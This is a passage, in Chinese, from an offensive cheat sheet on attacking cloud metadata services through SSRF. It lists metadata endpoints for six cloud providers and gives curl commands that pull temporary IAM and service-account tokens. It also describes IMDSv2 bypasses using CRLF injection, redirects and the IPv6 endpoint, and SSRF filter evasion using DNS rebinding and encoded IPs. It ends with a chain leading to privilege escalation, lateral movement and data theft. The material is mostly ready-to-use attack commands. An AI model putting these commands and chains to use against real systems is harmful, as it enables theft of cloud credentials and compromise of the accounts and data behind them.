## 四、元数据服务攻击与 SSRF 利用链

### 4.1 云元数据端点

| 云平台 | 元数据地址 | 凭据路径 |
|--------|----------|---------|
| AWS | http://169.254.169.254 | /latest/meta-data/iam/security-credentials/ROLE |
| Azure | http://169.254.169.254 | /metadata/identity/oauth2/token?api-version=2018-02-01&resource=RESOURCE |
| GCP | http://metadata.google.internal / http://169.254.169.254 | /computeMetadata/v1/instance/service-accounts/default/token |
| 阿里云 | http://100.100.100.200 | /latest/meta-data/ram/security-credentials/ROLE |
| 腾讯云 | http://metadata.tencentyun.com | /latest/meta-data/cam/security-credentials/ROLE |
| 华为云 | http://169.254.169.254 | /openstack/latest/securitykey |

```bash
# AWS IMDSv1 一键取凭据
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# 阿里云
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE>

# GCP（需Metadata-Flavor头）
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure（需Metadata: true头）
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 4.2 IMDSv2 绕过（AWS）

```bash
# IMDSv2 需要 PUT 获取Token（TTL必须）
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl "http://169.254.169.254/latest/meta-data/" -H "X-aws-ec2-metadata-token: TOKEN"

# SSRF支持PUT方法（可发任意请求的SSRF，如某些代理类SSRF）→ 直接GET Token
# 技巧：CRLF注入构造PUT；或利用302跳转将GET转为PUT（部分SSRF实现支持）
# X-aws-ec2-metadata-token-ttl-seconds 最小值必须为1以上，设0报错
```

**IMDSv1 被强制关闭的绕法（2025-2026实战）：**
```
1. IPv6 元数据端点：如果实例启用了IPv6但仅关闭了IPv4的IMDSv1
   curl "http://[fd00:ec2::254]/latest/meta-data/"
2. 附加网络接口 ENI 的元数据（在容器/多网卡场景）
   curl "http://169.254.169.254" 对每个网卡命名空间内可访问
3. 容器共享宿主网络命名空间（hostNetwork pod）→ 直连宿主IMDS
4. 利用 instance-identity-document 中的 region/accountId 辅助枚举
```

### 4.3 SSRF 利用链（含 GCP 特殊路径）

```
1. 发现应用层 SSRF（URL参数、图片代理、Webhook、PDF生成、Office转换）
2. 请求元数据端点获取临时凭据（注意不同平台的Header要求）
3. GCP 独有：即使无法出网，也可读取项目元数据（ssh密钥、项目编号）辅助进一步攻击：
   curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
   curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true
4. 使用临时凭据调用云API → 权限提升/横向移动/数据窃取
5. 高级：元数据服务作为代理反弹（GCP metadata header注入）
```

### 4.4 元数据攻击的进阶利用

- **凭据时效性**：临时凭据有效期 AWS 默认最长6小时，需在窗口内完成利用；可反复刷新
- **DNS重绑定**：SSRF有域名白名单时，用 `169.254.169.254.nip.io` 等技巧或DNS rebinding绕过
- **协议限制绕过**：`http://<EMAIL-REDACTED>`、十进制IP、IPv6、URL编码
- **Lambda/容器环境**：`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`（169.254.170.2）与 `AWS_CONTAINER_CREDENTIALS_FULL_URI` 环境变量暴露的另一个凭据端点，SSRF同样可达

